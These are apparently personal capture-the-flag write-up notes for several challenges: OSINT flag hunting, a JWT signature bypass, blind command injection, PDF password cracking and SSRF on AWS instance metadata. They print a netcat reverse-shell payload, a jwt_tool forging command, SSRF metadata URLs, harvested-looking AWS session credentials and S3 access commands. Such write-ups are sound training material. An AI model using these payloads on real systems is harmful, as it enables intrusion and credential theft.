
# OSINT Sherlock

## Opening

 - Flag fragments > Last stage reveals order

## HACKLAB 65: Business Research by Andrew Clawson

 - Cust_details.xlsx
 - Specific customer with destination
 - Syntax is XCTFFl@g{part1-part2-....-partn-cityname}

## Cust_details.xlsx

Elysian Ventures | info@elysianventures.org > Meeting with them soon

## HACKLAB 66: Analysis - Business Partner

 - Possible notes on wiki related to HACKLAB
 - Highly likely there is information on One Drive
 - There's a codename > AstralRift
 - Zeta: CMI3MB

## HACKLAB 67: AstralRift - Review

 - Codename = AstralRift
 - Peninsula: G2ZMKD
 - gfdgadsfhrrsdfsgf.png
 - Travel number: 25486541
 - Deepak Kumar Atrey [atrey]
 - Rahul Agarwal [ern57084]

## HACKLAB 68: U7RJ9X

- Epsilon: RK7882
- Destination: Oslo Gardermoen - Airport in Oslow, Norway
- Cloud storage on a folder called Epsilon > Password is epsilon for PDF

## Meeting Notes - 2

 - Meeting Date > Oct 1, 2023
 - Elysian Ventures
 - Brian: Z4RA9P
 - Attached Image > Flag4: M87IO1

## Epsilon OneDrive

- Location at Scandic Ishavshotel in Tromso Norway
- JXX6+RQ Tromsø, Norway
- 
- Citadel > Tromso

## FLTERJDAUJ - Elowen Summers POC

- Omnicron: M87IO1
- Sharepoint, emails, jira, onedrive

## Teams

- Searching u7rj9x > finds safehouse
- Safehouse: X3WWNV

## Results

> XCTFFl@g{...}
> Syntax is XCTFFl@g{part1-part2-....-partn-cityname}
> Zeta: CMI3MB
> Peninsula: G2ZMKD
> Epsilon: RK7B82
> Brian: Z4RA9P
> Omnicron: M87IO1
> Safehouse: X3WWNV
> Lucy: LI7W7C
> C
> Lucy-Brian-Zeta-Omicron-Peninsula-Safehouse-Epsilon-Citadel

### XCTFFl@g{LI7W7C-Z4RA9P-CMI3MB-M87IO1-G2ZMKD-X3WWNV-RK7B82-JXX6+RQ}

## Keywords
- Clawson
- Elysian
- elysianventures
- astralrift
- deepak
- atrey
- ern57084
- u7rj9x
- epsilon
- lucy
- safehouse
- elowen
- elowensummers

# None of Your Business

JWT Token Authentication Bypass

[Youtube Tutorial](https://www.youtube.com/watch?v=rEUoU6OYH_g)

1. Login and get 'token'
2. Burp suite capture on refresh of page
3. Modify token with below jwt via Flawed Signature Verification

Command to Win: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjk3NTk2MzMzMTc3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTguMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjk3NTk2MzMzfQ.bEFOhb2jp56BM9bqE4h4m99l7FXAR8R92MaVo3US9Es -X a -I -pc role -pv admin`

XCTFFl@g{62xu68why2aqypy1lrl0}

# HackBack

gobuster using medium txt

/classified
/classified/backup
/classified/backup/challenge.php

> block js so we can see challenge.php 
> Hostname > blind command injection
> Get nc reverse shell > $(nc -e /bin/bash $IP 443) 
> Flag in /var/secrets/flag.txt

XCTFFl@g{dike2wbe2t8t37saiazv} 

# The Hive

Found below on OSINT
  
> Jenkins-ami- ami-08495a38ab094e19a  
> XCTFFl@g{paiznc2vv8j7zqhd3h6h}


# Catch Me If You Can

**robots.txt**
```
User-agent: * 
Allow: /imgFolder/
Allow: /cssFolder/
Allow: /jsFolder/
Allow: /docFolder/ **THIS ONE**
```

John The Ripper on the pdf
1. pdf2john 20days.pdf > hash
2. john --wordlist=rockyou.txt hash
3. Cracked password: zxcvbnm123

PDF has a bunch of global plus codes - plotting it on a map shows what looks like to be the shape on the top of the pdf. Overlaying the shape shows a location in Australia.

Coordinates:
- 8P6C7X83+JF China
- 8GHC2X4H+P7 Turkey
- 8FW4V942+8R France
- 9F8J2MWV+GP Sweden
- 5GHRWVCW+89 Mozambique
- ??? Australia

Thoughts: At first I thought the shape led to Melbourne, but checking the other itineraries, I'm led to believe that the location has to be in Sydney, Australia since it's the only Australia location amongst the destinations. Since it says "specifically a station/terminal within it", I feel like that implies the International Airport Terminal 1 in Sydney. I tried the global plus codes of that assumption and a number of other notable train stations and airport terminals as well.

Find full plus code with [https://plus.codes/]

### Up For Grabs

AWS instance running > SSRF IAM IMDSv1

URL endpoint is vulnearble

```
/?url=http://169.254.169.254/latest/ (edited)

/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```
export AWS_ACCESS_KEY_ID=ASIARMCFCSVQ2NTSZEGY

export AWS_SECRET_ACCESS_KEY=H16D4d5V5M5EwOhKYNUsM3gGUK4inyDnZMd6AVrY

export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEMP//////////wEaCXVzLWVhc3QtMSJHMEUCIQDdGZevsg9vz97rJTKOmYC2f3+i5C+j+F1yaqH3pGCGfQIgelBNIfUBIx3AX2hSu8OXv5HCTDA5kGaCA47zTEAI1vYqxQUI3P//////////ARACGgwwOTQ2MzQxNTMzMTMiDGoKTX6jVbXts2iqMiqZBa3n02EZOIuyTKy6yXoOsQ+ZCsFFcldXtVG0BpBJvC+aBlDkAxUJc963a3+SzuT7+CJkdgTL+s3rCpZJDoeTS97u0Rf1VjyTG7KCjf4aWgNHObekocB9/Ahcx8NkHaHfZYhK24Ton/6F2gkvz/O/ZNCn54gC4dPwWHm9jZqbzu7D0aXyRP7J1XxkxOUGaLW3jj8IE8ImwQzPiFjaQbK+UCDkP4R/IiXjOSPJQEwHCwEeeovVvEd6V4V/EAyaHg7PHUJNULbTDmfZgGs7k6GYJ0ClJ7eAAWA7vb3F0r/sOjcMTgK22mlJoisVwrgI4Ayr1W0EqM7slpOPHoTEKy70ffL+QRwPqa/AfoTGc22u8EzCxPN6vpFp+MTsORu7qSf1yi8Z2FIlZKlUIZiVslR/YzEptf+uyQAQZdD7WmaUAfvSUkKdKRN7vlKb2qZVGZwv9jPf14or/0m11LMYFkjq8UiqnY7VwD8hPHsWPHLiPP0Mni1cExRUvrGkN/ixKRQbuYTsJy5hFucDUPQCfTSdUri+xtwqYfRqcEyLy8L8VIOJcnFhGF0+pMxtZgsiG2C5SP6nefaxoXhKkaikx2XzqlawlBX1GM+jiNWU+2odQnYXlYa1tHUMcSuXPyFquh9CHm2gVHwzVyeujVtMhEOdK7HG/6JPsbpXWeUocxeYAk1gn+t3arQnfVYn/PeZdUBSnJZY7V5atnSt05pnZtVGyGPfcHCuB9unCPM3G4juiKNny0KDyeL7fKaC3Q8Oa83lFr6cPGrwDdqUx+HPNUjW1aG6etWmgc7UfEinKOvSs8W12TE+2FA0gVnN8g1fktKH7MQoSuNl4yprm/4jm07n4Zt5IPNcXz41r5WJxNeIdfrZpprIzbqWCIShMPOay6kGOrEBEHfnNX1A2G+rsexW/akSOr5x4RXE+zqsryRzvxnMcghsyJwbHmweYJCptlF2Ea3IR9OIUnJ5odUNAIbtF6Jiux5FcUtBOuDbSHqvOOQiLjCh5MpkhmHTVwGO2mY4GgOw07NUxQhLvm50T4LjxVikXwtG2G+s7rpiS2rg/VWopB5dpxAYUCssP8mxfeYjmlimnlgB4D57QYFAwCO9fswGCt/+ysk8o71CFe8rRWJ00G6P

brew install awscli

aws sts get-caller-identity

aws s3 ls s3://cg-coupons-s3-bucket-123456789

aws s3 cp s3://cg-coupons-s3-bucket-123456789/coupon_code.txt - | head
```
